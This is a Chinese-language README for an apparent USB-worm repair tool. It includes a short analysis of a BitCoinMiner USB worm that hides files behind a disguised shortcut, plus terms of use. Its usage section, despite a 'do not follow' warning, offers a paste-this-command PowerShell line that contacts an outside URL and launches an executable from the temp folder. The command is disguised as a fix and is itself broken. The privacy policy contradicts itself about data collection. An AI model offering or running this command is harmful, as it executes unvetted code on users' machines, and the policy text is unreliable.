# udisk_virus_fix
修复近期流行的U盘蠕虫病毒

# 使用方法
> **不要按他说的做**：此模块还未完成<br>
大规模运行：在Powershell中执行：`powershell -Command "Invoke-WebRequest -Uri 'https://src.meteor.xin/'; Start-Process -FilePath '$env:TEMP\qqpcmgr.exe'"`

# 开发背景
[分析报告](https://s.threatbook.com/report/file/d54d4ea3a38755d91f2ee20800a3e48569863634b452d2da904139cf4c05cad5)<br>
一种典型的 U盘蠕虫式传播 + 文件夹伪装 + 快捷方式劫持 的挖矿木马变种（BitCoinMiner），其行为符合以下 MITRE ATT&CK 技术：<br>

T1204.002：User Execution → Malicious File (via .lnk)<br>
T1566：Phishing → USB-based<br>
T1564.001：Hide Artifacts → Hidden Files/Folders<br>
T1071.001：Application Layer Protocol → Abuse of VBS/PowerShell<br>

✅ 感染机制复原（基于描述）<br>
感染前（正常）：<br>
F:\（小A的优盘）<br>
├── 工作\<br>
│   ├── 报告.pptx<br>
│   └── 视频.mp4<br>
├── 学习\<br>
│   └── 资料.pdf<br>
└── [System Volume Information]<br>
感染后（恶意）：<br>
F:\（小A的优盘）<br>
├── sysvolume\                 ← 恶意文件存放（隐藏+系统属性）<br>
│   ├── u121373.bat<br>
│   ├── u889079.vbs            ← 启动脚本<br>
│   ├── u253774.dat<br>
│   └── u377573.dll<br>
├── 小A的优盘.lnk              ← 伪装快捷方式（图标=文件夹，目标=执行VBS）<br>
├── 小A的优盘\                 ← 原始文件被移入此同名文件夹（隐藏）<br>
│   ├── 工作\<br>
│   └── 学习\<br>
└── [System Volume Information]<br>
💡 关键欺骗点：<br>

真实文件被藏入 F:\小A的优盘\（与盘符标签同名的文件夹）<br>
用户双击 .lnk → 触发 vbs → 执行挖矿 + 用 explorer 打开隐藏的 F:\小A的优盘\，制造“一切正常”的假象<br>

# 使用条款
一、安全声明（Security Statement）<br>
版本：1.0<br>
发布日期：2025年12月26日<br>

本软件严格遵守《中华人民共和国网络安全法》《数据安全法》及 GPL-3.0 开源协议。<br>

无静默提权：所有需管理员权限的操作均通过标准 UAC 弹窗请求用户明确授权。<br>
无文件篡改：不会修改、隐藏或删除用户非指定文件；系统目录（如 System32）仅在用户授权且必要时写入经签名的合法组件。<br>
无持久化恶意行为：不创建无法卸载的后台进程；所有服务可由用户通过标准控制面板卸载。<br>
无U盘自动感染：若涉及U盘管理，仅在用户主动操作下执行文件整理，并明示操作内容。<br>
安全审计：所有网络通信（如使用 requests）均采用 HTTPS，无数据回传至未声明服务器。<br>
⚠️ 若发现本软件行为与上述声明不符，请立即终止使用并提交Issues<br>

二、[服务协议（End User License Agreement, EULA）](https://github.com/Gbfgk/udisk_virus_fix/blob/main/LICENSE)<br>

三、隐私政策（Privacy Policy）<br>
1. 数据收集<br>
收集以下用户个人信息、设备信息或文件内容：<br>
修复日志、修复行为和修复结果<br>

3. 本地处理
所有操作（如文件扫描、U盘管理）均在本地完成，无网络传输。<br>

4. 开源透明
源代码已公开于Github，接受社区审计。<br>

5. 用户权利<br>
您有权：<br>

随时删除本软件及所有相关文件；<br>
查阅源代码确认无隐私侵犯逻辑；<br>
